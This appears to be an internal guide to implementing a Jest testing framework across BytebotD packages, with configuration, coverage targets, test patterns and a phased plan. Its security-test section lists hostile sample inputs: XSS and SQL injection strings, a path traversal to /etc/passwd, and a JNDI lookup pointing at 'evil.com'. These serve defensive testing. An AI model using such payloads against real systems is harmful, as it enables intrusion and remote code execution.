# JEST GOLD STANDARD IMPLEMENTATION GUIDE

## OVERVIEW

This guide provides step-by-step instructions for implementing BytebotD's enterprise-grade Jest testing framework across all Bytebot packages. The gold standard framework provides **75% global coverage thresholds**, **enterprise reporting**, and **advanced performance monitoring**.

## QUICK START IMPLEMENTATION

### 1. **INSTALL DEPENDENCIES**

```bash
npm install --save-dev \
  @jest/globals \
  @types/jest \
  jest \
  jest-html-reporters \
  jest-junit \
  ts-jest \
  typescript
```

### 2. **COPY CONFIGURATION FILES**

From the templates in `development/reports/`:

```bash
# 1. Copy Jest configuration
cp development/reports/jest-gold-standard-template.js jest.config.js

# 2. Create test-utils directory
mkdir -p src/test-utils

# 3. Copy test utility files
cp development/reports/test-utils-templates/simple-setup.ts src/test-utils/
cp development/reports/test-utils-templates/setupAfterEnv-template.ts src/test-utils/setupAfterEnv.ts
```

### 3. **CUSTOMIZE CONFIGURATION**

Edit `jest.config.js`:

```javascript
// Update these key fields:
displayName: {
  name: 'Your-Package-Name', // ← CHANGE THIS
  color: 'blue',
},

// Customize coverage thresholds for your critical modules:
coverageThreshold: {
  global: { branches: 75, functions: 75, lines: 75, statements: 75 },
  './src/core/': { branches: 80, functions: 80, lines: 80, statements: 80 },
  './src/services/': { branches: 80, functions: 80, lines: 80, statements: 80 },
  // Add your critical modules here
},

// Update reporting titles:
pageTitle: 'Your Package Test Report',
suiteName: 'Your Package Tests',
```

### 4. **ADD PACKAGE.JSON SCRIPTS**

```json
{
  "scripts": {
    "test": "jest --config jest.config.js",
    "test:watch": "jest --config jest.config.js --watch",
    "test:coverage": "jest --config jest.config.js --coverage",
    "test:ci": "jest --config jest.config.js --coverage --ci --watchAll=false"
  }
}
```

### 5. **CUSTOMIZE TEST UTILITIES**

Edit `src/test-utils/setupAfterEnv.ts`:

1. **Replace example custom matchers** with your domain-specific validations
2. **Add test data factories** for your domain objects
3. **Extend TestUtils** with package-specific utilities

### 6. **VERIFY INSTALLATION**

```bash
npm test
npm run test:coverage
```

## ADVANCED FEATURES GUIDE

### 🏆 **COVERAGE THRESHOLDS STRATEGY**

```javascript
// Tiered coverage approach:
coverageThreshold: {
  // Standard modules: 75% coverage
  global: { branches: 75, functions: 75, lines: 75, statements: 75 },
  
  // Critical business logic: 80% coverage
  './src/services/': { branches: 80, functions: 80, lines: 80, statements: 80 },
  './src/core/': { branches: 80, functions: 80, lines: 80, statements: 80 },
  
  // Security modules: 90% coverage
  './src/auth/': { branches: 90, functions: 90, lines: 90, statements: 90 },
  './src/security/': { branches: 90, functions: 90, lines: 90, statements: 90 },
}
```

### 🧪 **CUSTOM MATCHERS EXAMPLES**

```typescript
// Domain-specific validation examples:
expect.extend({
  // API response validation
  toBeValidApiResponse(received): jest.CustomMatcherResult {
    const isValid = received && 
      typeof received.success === 'boolean' &&
      received.timestamp instanceof Date;
    
    return {
      pass: isValid,
      message: () => isValid 
        ? `Expected ${received} not to be a valid API response`
        : `Expected ${received} to be a valid API response`
    };
  },
  
  // User object validation
  toBeValidUser(received): jest.CustomMatcherResult {
    const isValid = received &&
      typeof received.id === 'string' &&
      typeof received.email === 'string' &&
      /\S+@\S+\.\S+/.test(received.email);
    
    return {
      pass: isValid,
      message: () => isValid
        ? `Expected ${received} not to be a valid user`
        : `Expected ${received} to be a valid user`
    };
  },
});
```

### 📊 **TEST DATA FACTORIES PATTERNS**

```typescript
export const TestDataFactory = {
  // User factory with realistic data
  createUser(overrides = {}): User {
    return {
      id: `user_${Date.now()}_${Math.random().toString(36).substring(7)}`,
      email: `test${Date.now()}@example.com`,
      name: 'Test User',
      createdAt: new Date(),
      isActive: true,
      ...overrides,
    };
  },
  
  // API response factory
  createApiResponse<T>(data: T, success = true, overrides = {}): ApiResponse<T> {
    return {
      success,
      data: success ? data : null,
      error: success ? null : { message: 'Test error', code: 'TEST_ERROR' },
      timestamp: new Date(),
      requestId: `req_${Date.now()}_${Math.random().toString(36).substring(7)}`,
      ...overrides,
    };
  },
};
```

### ⚡ **PERFORMANCE MONITORING SETUP**

```typescript
// Custom performance thresholds
const performanceMonitor = {
  slowTestThreshold: 3000,     // 3 seconds for API tests
  memoryLeakThreshold: 25 * 1024 * 1024, // 25MB for smaller packages
  
  // Custom performance assertions
  assertPerformance(testName: string, startTime: number, maxDuration: number): void {
    const duration = Date.now() - startTime;
    if (duration > maxDuration) {
      throw new Error(`Test "${testName}" exceeded performance threshold: ${duration}ms > ${maxDuration}ms`);
    }
  },
};
```

## BYTEBOTD COVERAGE GAPS - IMPLEMENTATION PRIORITIES

### 🚨 **PHASE 1: CRITICAL MODULES (40% coverage target)**

Create tests for these high-priority untested modules:

#### **Input-Tracking Module (4 files)**
```bash
# Test files to create:
src/input-tracking/__tests__/input-tracking.controller.spec.ts
src/input-tracking/__tests__/input-tracking.gateway.spec.ts  
src/input-tracking/__tests__/input-tracking.service.spec.ts
src/input-tracking/__tests__/input-tracking.helpers.spec.ts
```

**Test Focus**: WebSocket gateway functionality, input event tracking, real-time communication

#### **CUA-Integration Module (5 files)**
```bash
# Test files to create:
src/cua-integration/__tests__/cua-integration.controller.spec.ts
src/cua-integration/__tests__/cua-integration.service.spec.ts
src/cua-integration/__tests__/cua-bridge.service.spec.ts
src/cua-integration/__tests__/cua-performance.service.spec.ts
src/cua-integration/__tests__/cua-vision.service.spec.ts
```

**Test Focus**: Computer Use API integration, performance monitoring, vision processing

#### **MCP Module (3 files)**
```bash
# Test files to create:
src/mcp/__tests__/bytebot-mcp.module.spec.ts
src/mcp/__tests__/compressor.spec.ts
src/mcp/__tests__/computer-use.tools.spec.ts
```

**Test Focus**: Model Context Protocol implementation, data compression, tool integration

### 🎯 **PHASE 2: INFRASTRUCTURE MODULES (70% coverage target)**

#### **Cache Module (2 files)**
```bash
src/cache/__tests__/cache.service.spec.ts
src/cache/__tests__/cache-key.generator.spec.ts
```

#### **Common Interceptors (5 files)**  
```bash
src/common/interceptors/__tests__/logging.interceptor.spec.ts
src/common/interceptors/__tests__/performance.interceptor.spec.ts
src/common/interceptors/__tests__/cache.interceptor.spec.ts
src/common/interceptors/__tests__/compression.interceptor.spec.ts
src/common/interceptors/__tests__/database.interceptor.spec.ts
```

### 🏁 **PHASE 3: COMPLETION (100% coverage target)**

#### **Core Application Files**
```bash
src/__tests__/app.controller.spec.ts
src/__tests__/app.service.spec.ts
```

#### **Versioning Components**
```bash
src/common/versioning/__tests__/api-version.decorator.spec.ts
src/common/versioning/__tests__/deprecation.guard.spec.ts  
src/common/versioning/__tests__/version.interceptor.spec.ts
```

## TEST WRITING PATTERNS

### 🧪 **STANDARD TEST STRUCTURE**

```typescript
import { Test, TestingModule } from '@nestjs/testing';
import { YourService } from './your.service';
import { TestUtils, TestDataFactory } from '../test-utils/setupAfterEnv';

describe('YourService', () => {
  let service: YourService;
  let module: TestingModule;

  beforeEach(async () => {
    const moduleRef = await Test.createTestingModule({
      providers: [YourService],
    }).compile();

    service = moduleRef.get<YourService>(YourService);
    module = moduleRef;
  });

  afterEach(async () => {
    await module.close();
  });

  describe('methodName', () => {
    it('should handle success case', async () => {
      // Arrange
      const testData = TestDataFactory.createApiResponse({ result: 'test' });
      
      // Act
      const result = await service.methodName(testData);
      
      // Assert
      expect(result).toBeValidApiResponse();
      expect(result.success).toBe(true);
      expect(result).toHaveReasonableExecutionTime(1000);
    });

    it('should handle error case', async () => {
      // Arrange
      const invalidData = null;
      
      // Act & Assert
      await expect(service.methodName(invalidData)).rejects.toThrow();
    });
  });
});
```

### 🔒 **SECURITY TEST PATTERNS**

```typescript
describe('SecurityValidation', () => {
  it('should reject malicious input', async () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'DROP TABLE users;',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/exploit}',
    ];

    for (const input of maliciousInputs) {
      await expect(service.processInput(input)).rejects.toThrow();
    }
  });

  it('should sanitize user input', async () => {
    const unsafeInput = '<img src=x onerror=alert(1)>';
    const result = await service.sanitizeInput(unsafeInput);
    
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('onerror');
  });
});
```

### ⚡ **PERFORMANCE TEST PATTERNS**

```typescript
describe('PerformanceBenchmarks', () => {
  it('should process requests within time limits', async () => {
    const startTime = Date.now();
    
    await service.processLargeDataset(testData);
    
    expect(Date.now() - startTime).toBeLessThan(5000); // 5 second limit
  });

  it('should handle concurrent requests', async () => {
    const requests = Array(100).fill(null).map(() => 
      service.processRequest(TestDataFactory.createRequest())
    );
    
    const results = await Promise.all(requests);
    
    expect(results).toHaveLength(100);
    results.forEach(result => {
      expect(result).toBeValidApiResponse();
    });
  });
});
```

## TROUBLESHOOTING

### ❌ **Common Issues & Solutions**

#### **Issue: TypeScript compilation warnings**
```
ts-jest[ts-jest-transformer] (WARN) Got a `.js` file to compile while `allowJs` option is not set to `true`
```

**Solution**: Update transform configuration in jest.config.js:
```javascript
transform: {
  '^.+\\.ts$': ['ts-jest', { /* options */ }],
},
transformIgnorePatterns: ['node_modules/(?!(.*\\.(mjs|jsx?|tsx?))$)'],
```

#### **Issue: Module resolution errors**
**Solution**: Update moduleNameMapper in jest.config.js:
```javascript
moduleNameMapper: {
  '^@/(.*)$': '<rootDir>/src/$1',
  '^@package/(.*)$': '<rootDir>/src/$1',
}
```

#### **Issue: Test timeouts**
**Solution**: Increase timeout or optimize tests:
```javascript
testTimeout: 30000, // 30 seconds
jest.setTimeout(30000); // In individual tests
```

## SUCCESS METRICS

### 📊 **TARGET COVERAGE PROGRESSION**

| Phase | Coverage Target | Test Files | Estimated Tests |
|-------|----------------|------------|-----------------|
| Current | 8.71% | 25 files | ~60 tests |
| Phase 1 | 40% | 37 files | ~150 tests |  
| Phase 2 | 70% | 50 files | ~250 tests |
| Phase 3 | 90% | 65 files | ~350 tests |
| **Final** | **100%** | **80 files** | **400+ tests** |

### ⏱️ **PERFORMANCE TARGETS**

- **Full test suite**: < 5 minutes execution time
- **Individual tests**: < 5 seconds (with warnings for slower tests)
- **Memory usage**: < 50MB heap growth per test
- **CI/CD integration**: Complete test + coverage reporting

### ✅ **QUALITY GATES**

Before marking implementation complete:

- [ ] All modules have test files
- [ ] Coverage thresholds met (75% global, 80% critical modules)
- [ ] Performance tests under time limits
- [ ] Security tests for all input validation
- [ ] HTML and JUnit reports generated
- [ ] CI/CD pipeline integration working
- [ ] No test warnings or errors

## CONCLUSION

The BytebotD Jest framework provides an enterprise-grade foundation that scales from single modules to large monorepos. The key to success is **systematic implementation** following the phase-based approach and **consistent application** of the gold standard patterns across all packages.